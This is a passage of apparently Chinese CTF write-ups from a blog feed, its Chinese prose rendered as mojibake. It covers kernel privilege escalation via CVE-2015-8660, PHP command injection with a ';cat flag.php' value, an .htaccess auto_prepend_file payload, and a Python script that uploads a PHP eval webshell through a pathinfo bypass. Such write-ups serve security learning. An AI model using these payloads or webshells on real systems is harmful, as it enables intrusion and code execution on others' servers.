.&#x2F;linux-exploit-suggester.sh</p></blockquote><p>Êî∂ÈõÜ‰∏ÄÊ≥¢‰πãÂêéÂèëÁé∞ÂèØ‰ª•‰ΩøÁî®ËÑèÁâõÊèêÊùÉÔºå‰ΩÜÊòØËØï‰∫ÜÂá†Ê¨°ÈÉΩÊääÈù∂Êú∫ÊêûÂùè‰∫ÜÔºåÊç¢‰∏ÄÁßçÊñπÊ≥ïÂêß„ÄÇ Êàë‰ΩøÁî®ÁöÑÂ§öÁöÑ‰ø°ÊÅØÊî∂ÈõÜÂ∑•ÂÖ∑ÊòØ<strong>linpeas.sh</strong>„ÄÇ Â•Ω‰∫ÜÂÖà‰ΩøÁî®ÂÜÖÊ†∏ÊèêÊùÉÊêúÁ¥¢Ubuntu14.04ÁâàÊú¨ÊèêÊùÉÊºèÊ¥û ÊâæÂà∞‰∏Ä‰∏™<a href="https://www.exploit-db.com/exploits/39166">CVE-2015-8660</a></p><p>‰∏ãËΩΩ‰πãÂêéÊâßË°å‰ª•‰∏ãÂëΩ‰ª§Â∞±Ë°å</p><blockquote><p>gcc 39166.c -o dayu chmod 777 czy .&#x2F;dayu</p><p>ÊèêÊùÉÊàêÂäü <img src="https://img-blog.csdnimg.cn/58e4f735e80748d499a4ac198f5ae0fb.png" alt="1"> ‰πãÂâç‰ΩøÁî®linpeas.shÊî∂ÈõÜ‰ø°ÊÅØÊó∂ÂèëÁé∞ËøòÊúâ‰∏™Âú∞ÊñπÊúâÈóÆÈ¢ò <img src="https://img-blog.csdnimg.cn/d8c77bb96f4c484586bcd00c0c8e223e.png" alt="1"> Âú®rootÁõÆÂΩï‰∏ãÂèëÁé∞ËøòÊúâ‰∏Ä‰∏™pythonÊñá‰ª∂switcher.pyÊñá‰ª∂ÔºåÂÜÖÂÆπ‰∏é3‰∏™doorÊñá‰ª∂ÊúâÂÖ≥ÔºåËøôÈáåÊ∂âÂèäÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÁöÑÈóÆÈ¢òÔºåÊúâÊó∂Èó¥ÂÜçÁúã„ÄÇ ÁÑ∂ÂêéËøòÊúâ‰∏ÄÁßçÊèêÊùÉÊñπÊ≥ïÂ∞±ÊòØ<strong>UDFÊèêÊùÉ</strong> Áõ¥Êé•Áî®ÁöÑexpÔºö</p></blockquote><p><img src="https://img-blog.csdnimg.cn/a1a2a7ff0ac242e8a35747b3d27ce149.png" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> Èù∂Âú∫ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ÁæäÂüéÊùØ2022</title>
      <link href="/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/"/>
      <url>/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h3><blockquote><p>tipsÔºöstrings Êü•ÁúãÈü≥È¢ëÊñá‰ª∂</p></blockquote><p>webÁïåÈù¢Èô§‰∫Ü‰∏Ä‰∏™Èü≥È¢ëÔºåÊ≤°Êúâ‰ªÄ‰πàÂèØÁúãÁöÑÂú∞ÊñπÔºåÂè≥ÈîÆÊü•Áúã‰ª£Á†Å‰πüÊó†„ÄÇ<br>ÊúÄÂêé‰∏ãËΩΩÈü≥È¢ëËøõË°åÊü•ÁúãÔºå‰ΩøÁî®<code>strings Èü≥È¢ëÊñá‰ª∂</code>Âú®Êú´Â∞æÁúãÂà∞Ê∫êÁ†Å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Title<span class="token constant">APETAGEX</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Black-Cat-Sheriff'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$clandestine = getenv("clandestine");if(isset($_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">']))    $clandestine = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>White<span class="token operator">-</span>cat<span class="token operator">-</span>monitor<span class="token string single-quoted-string">'], $clandestine);$hh = hash_hmac('</span>sha256<span class="token string single-quoted-string">', $_POST['</span>One<span class="token operator">-</span>ear<span class="token string single-quoted-string">'], $clandestine);if($hh !== $_POST['</span>Black<span class="token operator">-</span>Cat<span class="token operator">-</span>Sheriff<span class="token string single-quoted-string">'])&#123;    die('</span><span class="token keyword">echo</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nc"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'One-ear'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¶ñÂÖà‰ΩøÁî®POSTÊñπÂºèÊèê‰∫§ÂèÇÊï∞Black-Cat-SheriffÂíåOne-earÔºåclandestineÂ≠òÂÇ®ÁéØÂ¢ÉÂèòÈáèÁöÑÂÄº„ÄÇÁÑ∂ÂêéclandestineÂèàÂ≠òÂÇ®ÁªèËøáhash_hmacÂáΩÊï∞ÂìàÂ∏åËøêÁÆóÁöÑÂÄºÔºåhhÂ≠òÂÇ®ÁªèËøáhash_hmacÂáΩÊï∞ÂìàÂ∏åËøêÁÆóÁöÑÂÄºÔºåPOST‰º†ÂÖ•Black-Cat-SheriffÁöÑÂÄºÂíåhh‰∏çÁõ∏Á≠âÁöÑËØùÁªßÁª≠ÊâßË°å‰∏ãÈù¢ÂëΩ‰ª§„ÄÇ</p><p><strong>hash_hmacÂáΩÊï∞</strong><br>ËØ¥Êòé<br>hash_hmac ( string $algo , string $data , string $key [, bool $raw_output &#x3D; FALSE ] ) : string<br>ÂèÇÊï∞</p><ul><li><p>algo<br>Ë¶Å‰ΩøÁî®ÁöÑÂìàÂ∏åÁÆóÊ≥ïÂêçÁß∞Ôºå‰æãÂ¶ÇÔºö‚Äùmd5‚ÄùÔºå‚Äùsha256‚ÄùÔºå‚Äùhaval160,4‚Äù Á≠â„ÄÇ Â¶Ç‰ΩïËé∑ÂèñÂèóÊîØÊåÅÁöÑÁÆóÊ≥ïÊ∏ÖÂçïÔºåËØ∑ÂèÇËßÅ hash_hmac_algos() ÂáΩÊï∞„ÄÇ</p></li><li><p>data<br>Ë¶ÅËøõË°åÂìàÂ∏åËøêÁÆóÁöÑÊ∂àÊÅØ„ÄÇ</p></li><li><p>key<br>‰ΩøÁî® HMAC ÁîüÊàê‰ø°ÊÅØÊëòË¶ÅÊó∂ÊâÄ‰ΩøÁî®ÁöÑÂØÜÈí•„ÄÇ</p></li><li><p>raw_output<br>ËÆæÁΩÆ‰∏∫ TRUE ËæìÂá∫ÂéüÂßã‰∫åËøõÂà∂Êï∞ÊçÆÔºå ËÆæÁΩÆ‰∏∫ FALSE ËæìÂá∫Â∞èÂÜô 16 ËøõÂà∂Â≠óÁ¨¶‰∏≤„ÄÇ</p></li></ul><p>ËøîÂõûÂÄº<br>Â¶ÇÊûú raw_output ËÆæÁΩÆ‰∏∫ TRUEÔºå ÂàôËøîÂõûÂéüÂßã‰∫åËøõÂà∂Êï∞ÊçÆË°®Á§∫ÁöÑ‰ø°ÊÅØÊëòË¶ÅÔºå Âê¶ÂàôËøîÂõû 16 ËøõÂà∂Â∞èÂÜôÂ≠óÁ¨¶‰∏≤Ê†ºÂºèË°®Á§∫ÁöÑ‰ø°ÊÅØÊëòË¶Å„ÄÇ Â¶ÇÊûú algo ÂèÇÊï∞ÊåáÂÆöÁöÑ‰∏çÊòØÂèóÊîØÊåÅÁöÑÁÆóÊ≥ïÔºåËøîÂõû FALSE„ÄÇ<br><img src="https://img-blog.csdnimg.cn/6ee08b16227742af90dc5803049d27ba.png" alt="1"></p><p><img src="https://img-blog.csdnimg.cn/ca6ca0b3329c47ff8173d82eb56e2150.png" alt="2"></p><p>ÁÑ∂ÂêéËøòÊúâ‰∏Ä‰∏™Â∞èÁü•ËØÜÁÇπÂ∞±ÊòØ</p><blockquote><p>hash_hmac($algo, $data, $key)<br>ÂΩìdata‰∏∫Êï∞ÁªÑÊó∂ÔºåËøîÂõûÂÄº‰∏∫nullÔºàÁ©∫Ôºâ„ÄÇ</p></blockquote><p>ÂÜçÁúã‰ª£Á†ÅÔºö</p><blockquote><p>echo exec(‚Äúnc‚Äù.$_POST[‚ÄòOne-ear‚Äô]);</p><p>‰º†ÂÖ•<code>One-ear</code>‰∏∫<code>;cat flag.php</code>Ôºå‰∏∫‰∫ÜÊãøÂà∞flagÊñá‰ª∂„ÄÇ<br>$clandestine &#x3D; hash_hmac(‚Äòsha256‚Äô, $_POST[‚ÄòWhite-cat-monitor‚Äô], $clandestine);</p></blockquote><p>‰º†ÂÖ•<code>White-cat-monitor</code>‰∏∫Êï∞ÁªÑÂΩ¢ÂºèËÆ©clandestineËøîÂõû‰∏∫Á©∫ÔºànullÔºâ</p><blockquote><p>if($hh !&#x3D;&#x3D; $_POST[‚ÄòBlack-Cat-Sheriff‚Äô])</p></blockquote><p>Â¶ÇÊûúË¶ÅÊª°Ë∂≥Êù°‰ª∂ÁöÑËØùÂ∞Ü‰∏ãÈù¢‰ª£Á†ÅËøêË°åÁöÑÁªìÊûúËµãÂÄºÁªôBlack-Cat-Sheriff</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha256'</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">";cat flag.php"</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ÂéüÁêÜÂ∞±ÊòØ<code>$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);</code>‰∏≠ÁöÑ<code>$clandestine</code>Ê≠§Êó∂Âèó‰∏äÈù¢<code>$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;], $clandestine);</code>ÁöÑÂΩ±ÂìçÔºåÊ≠§Êó∂<code>$clandestine</code>‰∏∫null„ÄÇÂç≥Êª°Ë∂≥‰∫ÜÊù°‰ª∂„ÄÇ<br><img src="https://img-blog.csdnimg.cn/c011321dc2ce4571ade8bb4d58d9774c.png" alt="3"></p><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><blockquote><p>tipsÔºö.htaccessÊñá‰ª∂</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z\.]/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\nHello, world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáå‰ª•ÂèÇÊï∞contentÂíåfilename‰º†ÂÖ•Êñá‰ª∂ÂÜÖÂÆπÂíåÊñá‰ª∂ÂêçÔºåÂÜÖÂÆπ‰∏≠‰∏çËÉΩÂ∏¶Êúâ<code>onÔºåhtmlÔºåtypeÔºåflagÔºåuploadÔºåfile</code>„ÄÇÂπ∂‰∏îÊñá‰ª∂ÂêçÂè™ËÉΩÊòØÂ∞èÂÜôÂ≠óÊØç„ÄÇ<br><code>file_put_contents($filename, $content . &quot;\nHello, world&quot;);</code><br>ËøôÈáåÁöÑÊñá‰ª∂ÂÜÖÂÆπ‰ºöÊãºÊé•‰∏ähelloworld„ÄÇ<br>ÂÜôÂÖ•ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><blockquote><p><code>php_value auto_prepend_fil\ e .htaccess #&lt;?php system(&#39;cat /fla?);?&gt;\ </code></p></blockquote><p>php_value auto_prepend_fileÁî®Êù•Âú®È°µÈù¢Â∫ïÈÉ®Âä†ËΩΩÊñá‰ª∂ÔºåÁî±‰∫éfileË¢´ËøáÊª§‰∫ÜÔºåËøôÈáå‰ΩøÁî®<code>fil\%0Ae</code>Ôºå<code>#</code>ÊòØ‰∏∫‰∫ÜËøéÂêà**.htaccess**ÁöÑ‰π¶ÂÜôÂΩ¢Âºè„ÄÇÂ∞æÈÉ®ÁöÑ<code>\</code>ÊòØ‰∏∫‰∫ÜËΩ¨‰πâÂêéÈù¢ÁöÑÊç¢Ë°åÁ¨¶„ÄÇÊúÄÂêéÊ†ºÂºè‰∏∫</p><blockquote><p>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla'.'g');?>\hellowprld<br>Â¶ÇÊûúÊòØ<br>php_value auto_prepend_fil<br>e .htaccess<br>#<?php system('cat /fla?');?><br>helloworld<br>ËøôÊ†∑‰ºöÊä•Èîô500.</p></blockquote><p><img src="https://img-blog.csdnimg.cn/cb25147337d94147ba512a0d14fbc9dd.png" alt="5"></p><p>‰ºòÁßÄÊñáÁ´†Ôºö<br><a href="https://www.cxyzjd.com/article/Zero_Adam/116808755">ÁæäÂüéÊùØ2020 easyphp ‚Äî ‰º™ÂçèËÆÆÁöÑ‰ΩøÁî®Êó∂Êú∫Ôºå‚Äîpython‰∏ä‰º†.htaccessÁöÑÂà©Áî® ‚Äì preg_matchÁªïËøá_Zero_AdamÁöÑÂçöÂÆ¢-Á®ãÂ∫èÂëòÂÆÖÂü∫Âú∞</a></p><p><a href="https://xz.aliyun.com/t/8267#toc-0">ApacheÁöÑ.htaccessÂà©Áî®ÊäÄÂ∑ß</a></p>]]></content>
      
      
      <categories>
          
          <category> nssctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssctf2ndweb</title>
      <link href="/2023/09/02/nssctf2ndweb/"/>
      <url>/2023/09/02/nssctf2ndweb/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h3 id="NSSCTF-2nd-phpÁ≠æÂà∞"><a href="#NSSCTF-2nd-phpÁ≠æÂà∞" class="headerlink" title="[NSSCTF 2nd]phpÁ≠æÂà∞"></a>[NSSCTF 2nd]phpÁ≠æÂà∞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ph"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"htaccess"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_list</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please re-upload"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáåÊ∂âÂèäÂà∞‰∏Ä‰∏™ÂáΩÊï∞<strong>pathinfo</strong>Ôºå<a href="https://blog.zsxsoft.com/post/36">ÁªïËøápathinfo</a>Ôºå<code>pathinfo($filename, PATHINFO_EXTENSION)</code>Ëé∑ÂèñÊñá‰ª∂ÂêéÁºÄÂêçÊó∂Ëé∑ÂèñÁöÑ<code>.</code>ÂêéÈù¢ÁöÑÂÜÖÂÆπÔºåÂΩìÂá∫Áé∞Â§ö‰∏™ÁÇπÊó∂ÔºåÁªìÊûú‰∏∫ÊúÄÂêé‰∏Ä‰∏™<code>.</code>ÂêéÈù¢ÁöÑÂÜÖÂÆπ„ÄÇÊàë‰ª¨Âè™Ë¶Å‰º†ÂÖ•index.php&#x2F;.Â∞±ÂèØ‰ª•ÁªïËøápathinfoÁöÑÊ£ÄÊµã‰∫Ü„ÄÇÂΩì‰º†ÂÖ•Ê≠§ÂèÇÊï∞ÊòØ<code>1.php/.</code>Êó∂Ôºå<code>pathinfo</code>Ëé∑ÂèñÁöÑÊñá‰ª∂ÁöÑÂêéÁºÄÂêç‰∏∫NULLÔºåÊâÄ‰ª•ÂèØ‰ª•Âú®Êñá‰ª∂ÂêçÂêéÈù¢Ê∑ªÂä†<code>/.</code>Êù•ÂÆûÁé∞ÁªïËøáÔºåËÆ∞ÂæóurlÁºñÁ†ÅÊñá‰ª∂Âêç„ÄÇ<br>ËøôÈáåÊàë‰ΩøÁî®burp‰∏ä‰º†Êñá‰ª∂Â§±Ë¥•Ôºå‰∫éÊòØÈááÁî®pythonËÑöÊú¨‰∏ä‰º†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">upload_content_with_filename</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> content<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    upload_url <span class="token operator">=</span> <span class="token string">'http://node5.anna.nssctf.cn:28154/'</span>  <span class="token comment"># ÊõøÊç¢‰∏∫ÂÆûÈôÖÁöÑ‰∏ä‰º†URL</span>    content_to_upload <span class="token operator">=</span> <span class="token string">"&lt;?php @eval($_POST[1]); phpinfo(); ?>"</span>  <span class="token comment"># ÊõøÊç¢‰∏∫Ë¶Å‰∏ä‰º†ÁöÑÂÜÖÂÆπ</span>    filename_to_upload <span class="token operator">=</span> <span class="token string">"123.php%2F."</span>  <span class="token comment"># ÊõøÊç¢‰∏∫Ë¶ÅËÆæÁΩÆÁöÑÊñá‰ª∂Âêç</span>    response <span class="token operator">=</span> upload_content_with_filename<span class="token punctuation">(</span>upload_url<span class="token punctuation">,</span> content_to_upload<span class="token punctuation">,</span> filename_to_upload<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ÂÜÖÂÆπ‰∏ä‰º†ÊàêÂäüÔºÅ"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ÂÜÖÂÆπ‰∏ä‰º†Â§±Ë¥•„ÄÇ"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ÂìçÂ∫î‰ª£Á†Å:"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ÂìçÂ∫îÂÜÖÂÆπ:"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÑ∂ÂêéËøûÊé•ËöÅÂâëÔºåflagÂú®ÁéØÂ¢ÉÂèòÈáèÈáå<br><img src="https://img-blog.csdnimg.cn/e45ecf02df5f46b7bd9e79579b429f1b.png" alt="1"></p><h3 id="NSSCTF-2nd-MyBox"><a href="#NSSCTF-2nd-MyBox" class="headerlink" title="[NSSCTF 2nd]MyBox"></a>[NSSCTF 2nd]MyBox</h3><p><a 